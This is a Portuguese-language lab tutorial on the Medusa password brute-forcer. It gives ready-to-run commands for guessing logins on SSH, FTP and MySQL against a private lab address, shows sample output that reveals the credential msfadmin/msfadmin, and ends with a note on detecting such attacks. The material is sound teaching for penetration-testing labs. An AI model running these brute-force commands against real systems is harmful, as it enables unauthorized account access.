# 04 — Usando o Medusa

O Medusa é um brute-forcer **paralelo e modular**. Ele tenta combinações usuário/senha contra um serviço de rede, usando vários "fios" (threads) ao mesmo tempo.

## Anatomia do comando

```bash
medusa -h <alvo> -U <usuarios> -P <senhas> -M <modulo> [opções]
```

| Flag | Descrição |
|---|---|
| `-h` / `-H` | um host / arquivo com vários hosts |
| `-u` / `-U` | um usuário / arquivo de usuários |
| `-p` / `-P` | uma senha / arquivo de senhas |
| `-M` | módulo do serviço (`ssh`, `ftp`, `smbnt`, `mysql`, `telnet`…) |
| `-t` | threads paralelas (mais rápido, porém mais "barulhento") |
| `-f` | para no primeiro par válido **por host** |
| `-F` | para no primeiro par válido **em qualquer host** |
| `-O` | grava o log em arquivo |
| `-n` | porta customizada (se o serviço não está na padrão) |
| `-v` | nível de verbosidade |

Listar os módulos disponíveis:

```bash
medusa -d
```

## Exemplo guiado — SSH

```bash
medusa -h 192.168.56.101 \
       -U ../wordlists/usuarios.txt \
       -P ../wordlists/senhas.txt \
       -M ssh \
       -t 4 -f -O ../evidencias/medusa-ssh.log
```

### Interpretando a saída

```
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 User: msfadmin Password: 123456 (1 of 5)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin (2 of 5)
ACCOUNT FOUND:  [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

- `ACCOUNT CHECK` → tentativa em andamento.
- `ACCOUNT FOUND ... [SUCCESS]` → **credencial válida encontrada**. É o objetivo do ataque.

## Outros módulos no mesmo padrão

```bash
# FTP
medusa -h 192.168.56.101 -U ../wordlists/usuarios.txt -P ../wordlists/senhas.txt -M ftp -t 4 -f

# MySQL
medusa -h 192.168.56.101 -u root -P ../wordlists/senhas.txt -M mysql -t 2 -f
```

## Validando o acesso

Encontrada a credencial, confirma-se o acesso de verdade:

```bash
ssh msfadmin@192.168.56.101
```

Isso fecha o ciclo: a tentativa automatizada vira **acesso real** — exatamente o impacto que uma senha fraca causa.

## Ajuste de threads (`-t`)

- Mais threads = mais rápido, **porém** mais chance de derrubar o serviço, gerar erros e encher os logs do alvo.
- Em lab, valores baixos (`-t 2` a `-t 6`) já são suficientes e mais estáveis.

> 💡 **Visão defensiva:** o padrão de dezenas de tentativas de login em segundos é **altamente detectável**. Um `fail2ban` ou um SIEM mínimo bloqueia/alerta antes do atacante chegar perto de ter sucesso.
